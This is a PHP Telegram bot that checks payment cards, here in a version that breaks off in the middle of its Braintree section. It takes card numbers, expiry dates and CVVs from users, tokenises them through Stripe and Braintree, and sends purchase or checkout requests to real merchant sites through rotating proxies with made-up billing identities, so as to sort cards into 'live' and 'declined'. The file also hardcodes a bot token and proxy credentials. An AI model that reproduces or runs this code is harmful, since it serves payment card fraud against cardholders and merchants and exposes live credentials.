<?php

////////////////=============[Zeltrax Bot Raw]=============////////////////
////////==========[Join @ZeltraxRockz and @ZeltraxChat for more]==========////////

$botToken = "1854772640:AAHljgxHeXjKkXXAJv9TWT5LHdq_bibuQiU"; // 
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];

//////////=========[Start Command]=========//////////

if (strpos($message, "/start") === 0){
sendMessage($chatId, "<b>Hello there!!%0AType /cmds to know all my commands!!%0A%0ABot by --» Muhammad Rafli Aufa</b>", $message_id); //bebas ganti nama ente heheh
}

//////////=========[Cmds Command]=========//////////

elseif (strpos($message, "/cmds") === 0){
sendMessage($chatId, "<b>Bin :</b> <code>/bin</code> xxxxxx%0A%0A<b>STRIPE :</b> <code>/chk</code>%0A%0A<b>B3 :</b> <code>/b3</code>%0A%0A<b>STRIPE REQ 2 :</b> <code>/str2</code>%0A%0A<b>STRIPE INTENT :</b> <code>/schk</code>%0A%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>", $message_id);
}


//////////=========[Bin Command]=========//////////

elseif (strpos($message, "/bin") === 0){
$bin = substr($message, 5);
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
};
sendMessage($chatId, '<b>✅ Valid Bin</b>%0A<b>Country:</b> '.$name.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}


//////////=========[chk Command]=========//////////

if ((strpos($message, "!chk") === 0)||(strpos($message, "/chk") === 0)){  /// GATE STRIPE LOGIN
$lista = substr($message, 5);
$i     = explode("|", $lista);
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
function multiexplode($delimiters, $string){
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;}
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];
if(strlen($year) == 2){
$year = substr($year, -2);}
else{
$year = substr($year, 2);}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];}

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];


$Supported = substr($cc, 0, 1);
 if($Supported == "4") {
    $cctype = '1';
    }
 elseif ($Supported == "5") {
    $cctype = '3';
    }
  else {
    $cctype = '2';
    }


////////////////////////// BIN LOOKUP/////////////////////////////////////////////




    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = getStr($fim, '"bank":{"name":"', '"');
$name = getStr($fim, '"name":"', '"');
$brand = getStr($fim, '"brand":"', '"');
$country = getStr($fim, '"country":{"name":"', '"');
$scheme = getStr($fim, '"scheme":"', '"');
$currency = getStr($fim, '"currency":"', '"');
$emoji = getStr($fim, '"emoji":"', '"');
$type = getStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false) {
$bin = 'Credit';
}else{
$bin = 'Debit';}
/////////////////////////////////////BIN LOOKUP END////////////////////////////////////////////////////////////////
//----------------------------------------------------------------------------------------------------------------------//
$first = str_shuffle("ZELTRAX");
$last = str_shuffle("ROCKZ");
$first1 = str_shuffle("zeltrax85246");
$email = "".$first1."%40gmail.com";
$address = "".rand(0000,9999)."+Main+Street";
$phone = rand(0000000000,9999999999);
$country = "US";
$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$state = $st[$st1];
if ($state == "NY"){
$zip = "10080";
$city = "New+York";}
elseif ($state == "WA"){
$zip = "98001";
$city = "Auburn";}
elseif ($state == "AL"){
$zip = "35005";
$city = "Adamsville";}
elseif ($state == "FL"){
$zip = "32003";
$city = "Orange+Park";}
else{
$zip = "90201";
$city = "Bell";};
////////////////////////////===[Luminati Details]

//$username = 'Put Zone Username Here';
//$password = 'Put Zone Password Here';
//$port = 22225;
//$session = mt_rand();
//$super_proxy = 'zproxy.lum-superproxy.io'



////////////////////////////===[1st Req]

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'yyhuujgk-rotate:mg9nhg1o3pzy');
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
$headers = array();
$headers[] = 'authority: api.stripe.com';
$headers[] = 'method: POST';
$headers[] = 'path: /v1/tokens';
$headers[] = 'scheme: https';
$headers[] = 'accept: application/json';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'cache-control: no-cache';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://js.stripe.com';
$headers[] = 'pragma: no-cache';
$headers[] = 'referer: https://js.stripe.com/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$first.'+'.$last.'&card[address_line1]=220+Vesey+St&card[address_line2]=&card[address_city]=New+York&card[address_state]=NY&card[address_zip]='.$zip.'&card[address_country]=USA&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=f96a11c4-195f-4fe2-85d5-65628c3f2c4de792ff&muid=732eeb70-a3df-46ab-9451-d40223340f05f53037&sid=a11e5324-8936-4f71-9184-30b494c31ac254f01c&payment_user_agent=stripe.js%2F515271568%3B+stripe-js-v3%2F515271568&time_on_page=62609&referrer=https%3A%2F%2Fwww.themenlohouse.com%2F&key=pk_live_5KXASasfqRcm5eUNyyIsqhUQ&pasted_fields=number');



$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

# -------------------- [2 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'yyhuujgk-rotate:mg9nhg1o3pzy');
curl_setopt($ch, CURLOPT_URL, 'https://www.themenlohouse.com/api_checkout');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$headers = array();
$headers[] = 'authority: www.themenlohouse.com';
$headers[] = 'method: POST';
$headers[] = 'path: /api_checkout';
$headers[] = 'scheme: https';
$headers[] = 'accept: application/json, text/plain, */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'cache-control: no-cache';
$headers[] = 'content-type: application/json;charset=UTF-8';
$headers[] = 'cookie: PHPSESSID=cqdmmch8k3knvb76h3c93pfuk3; userLoggedinEvent=false; email_capture_modal_shown=true; ff_uuid_prd=60ca1f94ca45e9.77504346; _fbp=fb.1.1623859101589.876797497; __zlcmid=14ck6tUTnijFQln; cart-promo=undefined; ffinfo=aH%3D1687%26aW%3D1349%26dPr%3D1%26iMb%3Dfalse; __stripe_mid=732eeb70-a3df-46ab-9451-d40223340f05f53037; __stripe_sid=a11e5324-8936-4f71-9184-30b494c31ac254f01c; AWSALB=mQYcWA8ZwhUKtZf+3Sf2gKiooxj7ICTYrjIkOWv94ZorBwAD1IzIfgf4yPW1aNVQQSrHvexJfhtjSePTE6yAIwfHgnqNRvgDZYheNVO9d9eC4cJ9O+5IKFShRY3XtP5J0DtzWP4eFY2Jpm11wWENcp/lODSEVdFzzqWlfbvBdfNd2TNnGae1qi2tflsuWw==; AWSALBCORS=mQYcWA8ZwhUKtZf+3Sf2gKiooxj7ICTYrjIkOWv94ZorBwAD1IzIfgf4yPW1aNVQQSrHvexJfhtjSePTE6yAIwfHgnqNRvgDZYheNVO9d9eC4cJ9O+5IKFShRY3XtP5J0DtzWP4eFY2Jpm11wWENcp/lODSEVdFzzqWlfbvBdfNd2TNnGae1qi2tflsuWw==';
$headers[] = 'origin: https://www.themenlohouse.com';
$headers[] = 'pragma: no-cache';
$headers[] = 'referer: https://www.themenlohouse.com/checkout';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'{"billingDetails":{"stripeToken":"'.$id.'"},"pricing":{"price_ng":123.75,"priceMsrp_ng":123.75,"price_g":0,"priceMsrp_g":0,"subtotal":123.75,"shipping":0,"surcharge":0,"memberDiscount":0,"promoDiscount":0,"tax":0,"tax_percent":0,"discount_percentage":null,"discount_value":null,"total":123.75,"promoCodeMessage":null,"promoCodeValid":false,"coupon_type":null,"promoType":"","free_shipping":false,"promoCode":null,"vReferral":null,"credit":0,"bagItems":[{"product_id":12052,"title":"Fury Trench Coat - Charcoal","img":"mh-ff-on-fury-coat-char-1-601c8fedde063.jpg","cat_id":145,"price_member":"82.50","price_msrp":"123.75","fPriceCompareAt":"165.00","product_detail_id":55124,"color":"Charcoal","size":"LRG","inventory":3,"sku":"12052003","col_str":"28,36,95,96,99","price":"123.75","priceStrikeout":165,"priceBogo":"123.75","membershipStatus":"non-member","pricePrefix":"Sale Price: Now","bogoMsg":"","priceClass":"f-price f-sale","priceStrikeoutClass":"s-price s-sale","isSale":true,"isFinalSale":false,"isBogo":false,"quantity":1,"pricing_data":{"price":123.75,"priceStrikeout":165,"priceBogo":"123.75","membershipStatus":"non-member","pricePrefix":"Sale Price: Now","bogoMsg":"","priceClass":"f-price f-sale","priceStrikeoutClass":"s-price s-sale","isSale":true,"isFinalSale":false,"isBogo":false},"quantityOptions":[0,1,2,3],"shiphero_store":null,"isMemberPrice":false,"price_compareat":"165.00","isProdSale":true,"imgSrc":"https://storeimages.fivefourclub.com/store/mrv-resources/product/mh-ff-on-fury-coat-char-1-601c8fedde063.jpg","index":1}]},"method":"submitBillingDetails"}');


$result2 = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$ingfo = trim(strip_tags(getStr($result2,'{"success":false,"error":"','"}')));
"<br>message: $ingfo";



//////////////////////////////////////////////////////////////////////////////////////////////////////////////

if ((strpos($result2, 'success":true'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b>『 ★ CVV MATCHED ★ 』</b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE AUTH</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
elseif ((strpos($result2, 'security code is incorrect.'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b>『 ★ CCN LIVE! ★ 』</b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE AUTH</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}else{
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ '.$ingfo.' ★ 』</b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE AUTH</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
curl_close($ch);
}


////////////////////////////////////////////////////////////////////////////////////////////////


elseif ((strpos($message, "!b3") === 0)||(strpos($message, "/b3") === 0)){  /// GATE B3
$lista = substr($message, 4);
$i     = explode("|", $lista);
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
function multiexplode($delimiters, $string){
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;}
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];
if(strlen($year) == 2){
$year = substr($year, -2);}
else{
$year = substr($year, 2);}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];}

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];


$Supported = substr($cc, 0, 1);
 if($Supported == "4") {
    $cctype = '1';
    }
 elseif ($Supported == "5") {
    $cctype = '3';
    }
  else {
    $cctype = '2';
    }


////////////////////////// BIN LOOKUP/////////////////////////////////////////////




    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = getStr($fim, '"bank":{"name":"', '"');
$name = getStr($fim, '"name":"', '"');
$brand = getStr($fim, '"brand":"', '"');
$country = getStr($fim, '"country":{"name":"', '"');
$scheme = getStr($fim, '"scheme":"', '"');
$currency = getStr($fim, '"currency":"', '"');
$emoji = getStr($fim, '"emoji":"', '"');
$type = getStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false) {
$bin = 'Credit';
}else{
$bin = 'Debit';}
/////////////////////////////////////BIN LOOKUP END////////////////////////////////////////////////////////////////
//----------------------------------------------------------------------------------------------------------------------//
$first = str_shuffle("ZELTRAX");
$last = str_shuffle("ROCKZ");
$first1 = str_shuffle("zeltrax85246");
$email = "".$first1."%40gmail.com";
$address = "".rand(0000,9999)."+Main+Street";
$phone = rand(0000000000,9999999999);
$country = "US";
$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$state = $st[$st1];
if ($state == "NY"){
$zip = "10080";
$city = "New+York";}
elseif ($state == "WA"){
$zip = "98001";
$city = "Auburn";}
elseif ($state == "AL"){
$zip = "35005";
$city = "Adamsville";}
elseif ($state == "FL"){
$zip = "32003";
$city = "Orange+Park";}
else{
$zip = "90201";
$city = "Bell";};
////////////////////////////===[Luminati Details]

//$username = 'Put Zone Username Here';
//$password = 'Put Zone Password Here';
//$port = 22225;
//$session = mt_rand();
//$super_proxy = 'zproxy.lum-superproxy.io'



////////////////////////////===[1st Req]

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'yyhuujgk-rotate:mg9nhg1o3pzy');
curl_setopt($ch, CURLOPT_URL, 'https://app.rebillia.com/login/customers');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
$headers = array();
$headers[] = 'authority: app.rebillia.com';
$headers[] = 'method: POST';
$headers[] = 'path: /login/customers';
$headers[] = 'scheme: https';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'cache-control: no-cache';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://store.almanac.com';
$headers[] = 'pragma: no-cache';
$headers[] = 'referer: https://store.almanac.com/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: cross-site';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'bc_email='.$email.'');



$result1 = curl_exec($ch);
$apikey = trim(strip_tags(getStr($result1,'"token":"','"')));

# -------------------- [2 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'yyhuujgk-rotate:mg9nhg1o3pzy');
curl_setopt($ch, CURLOPT_URL, 'https://app.rebillia.com/customers/brainclienttoken?_=1623910679963');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$headers = array();
$headers[] = 'authority: app.rebillia.com';
$headers[] = 'method: GET';
$headers[] = 'path: /customers/brainclienttoken?_=1623910679963';
$headers[] = 'scheme: https';
$headers[] = 'accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'apikey: '.$apikey.'';
$headers[] = 'cache-control: no-cache';
$headers[] = 'origin: https://store.almanac.com';
$headers[] = 'pragma: no-cache';
$headers[] = 'referer: https://store.almanac.com/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: cross-site';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

# ----------------- [2req Postfields] ---------------------#

//curl_setopt($ch, CURLOPT_POSTFIELDS,'');


$result2 = curl_exec($ch);
$bearer1 = trim(strip_tags(getStr($result2,'"','"')));
$decode = base64_decode($bearer1);
$bearer = trim(strip_tags(getStr($decode,'"authorizationFingerprint":"','"')));

# -------------------- [3 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'yyhuujgk-rotate:mg9nhg1o3pzy');
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$headers = array();
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Authorization: Bearer '.$bearer.'';
$headers[] = 'Braintree-Version: 2018-05-10';
$headers[] = 'Cache-Control: no-cache';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Host: payments.braintree-api.com';
$headers[] = 'Origin: https://assets.braintreegateway.com';
$headers[] = 'Pragma: no-cache';
$headers[] = 'Referer: https://assets.braintreegateway.com/';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: cross-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

# ----------------- [3req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"d4f10c66-42c7-4e42-942e-f71d9d83316e"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","cardholderName":"'.$first.' '.$last.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');


$result3 = curl_exec($ch);
$token = trim(strip_tags(getStr($result3,'"token":"','"')));

# -------------------- [4 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'yyhuujgk-rotate:mg9nhg1o3pzy');
curl_setopt($ch, CURLOPT_URL, 'https://app.rebillia.com/customers/checkout');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$headers = array();
$headers[] = 'authority: app.rebillia.com';
$headers[] = 'method: POST';
$headers[] = 'path: /customers/checkout';
$headers[] = 'scheme: https';
$headers[] = 'accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'apikey: '.$apikey.'';
$headers[] = 'cache-control: no-cache';
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'origin: https://store.almanac.com';
$headers[] = 'pragma: no-cache';
$headers[] = 'referer: https://store.almanac.com/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: cross-site';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

# ----------------- [4req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'payment_method_nonce='.$token.'&oid=0&checkout_id=d13ea69f-1e22-42c5-814b-e091c796ac7c&cart_has_subscription=0&ip_address=&is_store_credit_applied=false&g_recaptcha_response=&deviceData=');


$result4 = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$ingfo = trim(strip_tags(getStr($result4,'"message":"','"')));
"<br>message: $ingfo";



//////////////////////////////////////////////////////////////////////////////////////////////////////////////

if ((strpos($result3, 'success":true'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b>『 ★ CVV MATCHED ★ 』</b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>BRAINTREE</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
elseif ((strpos($result3, 'Card Issuer Declined CVV'))){
